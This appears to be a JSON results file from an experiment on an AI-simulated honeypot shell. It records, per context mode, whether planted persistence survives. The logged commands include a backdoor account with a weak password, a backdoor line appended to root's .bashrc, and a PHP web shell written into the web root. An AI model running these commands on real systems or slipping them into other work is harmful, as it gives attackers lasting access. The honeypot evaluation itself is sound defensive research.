@@ -1,0 +1,110 @@
+[
+  {
+    "mode": "ORIGINAL",
+    "scenario_id": "HC-T1136-001",
+    "success": true,
+    "latency_ms": 2547.861337661743,
+    "context_tokens": 18,
+    "implant_response": "root@honeypot:~# useradd -m -s /bin/bash sysupdate && echo 'sysupdate:pass' | chpasswd\nroot@honeypot:~#",
+    "verify_response": "uid=1001(sysupdate) gid=1001(sysupdate) groups=1001(sysupdate)"
+  },
+  {
+    "mode": "ORIGINAL",
+    "scenario_id": "HC-T1546-004",
+    "success": true,
+    "latency_ms": 2488.2795810699463,
+    "context_tokens": 13,
+    "implant_response": "root@honeypot:~# echo 'export EVIL=backdoor' >> /root/.bashrc\nroot@honeypot:~#",
+    "verify_response": "export EVIL=backdoor"
+  },
+  {
+    "mode": "ORIGINAL",
+    "scenario_id": "HC-T1505-003",
+    "success": true,
+    "latency_ms": 2234.2512607574463,
+    "context_tokens": 14,
+    "implant_response": "root@honeypot:~# echo '<?php system($_GET[cmd]); ?>' > /var/www/html/shell.php\nroot@honeypot:~#",
+    "verify_response": "<?php system($_GET[cmd]); ?>"
+  },
+  {
+    "mode": "RAW_HISTORY",
+    "scenario_id": "HC-T1136-001",
+    "success": true,
+    "latency_ms": 2459.092140197754,
+    "context_tokens": 25,
+    "implant_response": "root@honeypot:~# useradd -m -s /bin/bash sysupdate && echo 'sysupdate:pass' | chpasswd\nroot@honeypot:~#",
+    "verify_response": "uid=1001(sysupdate) gid=1001(sysupdate) groups=1001(sysupdate)"
+  },
+  {
+    "mode": "RAW_HISTORY",
+    "scenario_id": "HC-T1546-004",
+    "success": true,
+    "latency_ms": 2705.575942993164,
+    "context_tokens": 15,
+    "implant_response": "root@honeypot:~# echo 'export EVIL=backdoor' >> /root/.bashrc\nroot@honeypot:~#",
+    "verify_response": "export EVIL=backdoor\nroot@honeypot:~#"
+  },
+  {
+    "mode": "RAW_HISTORY",
+    "scenario_id": "HC-T1505-003",
+    "success": true,
+    "latency_ms": 2835.0119590759277,
+    "context_tokens": 17,
+    "implant_response": "root@honeypot:~# echo '<?php system($_GET[cmd]); ?>' > /var/www/html/shell.php\nroot@honeypot:~#",
+    "verify_response": "<?php system($_GET[cmd]); ?>\nroot@honeypot:~#"
+  },
+  {
+    "mode": "FULL_CONTEXT",
+    "scenario_id": "HC-T1136-001",
+    "success": true,
+    "latency_ms": 2478.1627655029297,
+    "context_tokens": 31,
+    "implant_response": "root@honeypot:~# useradd -m -s /bin/bash sysupdate && echo 'sysupdate:pass' | chpasswd\nroot@honeypot:~#",
+    "verify_response": "uid=1000(sysupdate) gid=1000(sysupdate) groups=1000(sysupdate)"
+  },
+  {
+    "mode": "FULL_CONTEXT",
+    "scenario_id": "HC-T1546-004",
+    "success": true,
+    "latency_ms": 2493.5288429260254,
+    "context_tokens": 21,
+    "implant_response": "root@honeypot:~# echo 'export EVIL=backdoor' >> /root/.bashrc\nroot@honeypot:~#",
+    "verify_response": "export EVIL=backdoor\nroot@honeypot:~#"
+  },
+  {
+    "mode": "FULL_CONTEXT",
+    "scenario_id": "HC-T1505-003",
+    "success": true,
+    "latency_ms": 2077.362060546875,
+    "context_tokens": 23,
+    "implant_response": "root@honeypot:~# echo '<?php system($_GET[cmd]); ?>' > /var/www/html/shell.php\nroot@honeypot:~#",
+    "verify_response": "<?php system($_GET[cmd]); ?>\nroot@honeypot:~#"
+  },
+  {
+    "mode": "STATELESS",
+    "scenario_id": "HC-T1136-001",
+    "success": false,
+    "latency_ms": 3394.310235977173,
+    "context_tokens": 0,
+    "implant_response": "root@honeypot:~# useradd -m -s /bin/bash sysupdate && echo 'sysupdate:pass' | chpasswd\nroot@honeypot:~#",
+    "verify_response": "uid=0(root) gid=0(root) groups=0(root)"
+  },
+  {
+    "mode": "STATELESS",
+    "scenario_id": "HC-T1546-004",
+    "success": false,
+    "latency_ms": 24176.059007644653,
+    "context_tokens": 0,
+    "implant_response": "root@honeypot:~# echo 'export EVIL=backdoor' >> /root/.bashrc\nroot@honeypot:~#",
+    "verify_response": "# ~/.bashrc: executed by bash(1) for non-login shells.\n# see /usr/share/doc/bash/examples/startup-files (in the bash-doc package)\n# for examples\n\n# If not running interactively, don't do anything\ncase"
+  },
+  {
+    "mode": "STATELESS",
+    "scenario_id": "HC-T1505-003",
+    "success": true,
+    "latency_ms": 2575.610876083374,
+    "context_tokens": 0,
+    "implant_response": "root@honeypot:~# echo '<?php system($_GET[cmd]); ?>' > /var/www/html/shell.php\nroot@honeypot:~#",
+    "verify_response": "<?php\n// Simple web shell\nif(isset($_REQUEST['cmd'])) {\n    system($_REQUEST['cmd']);\n}\n?>"
+  }
+]
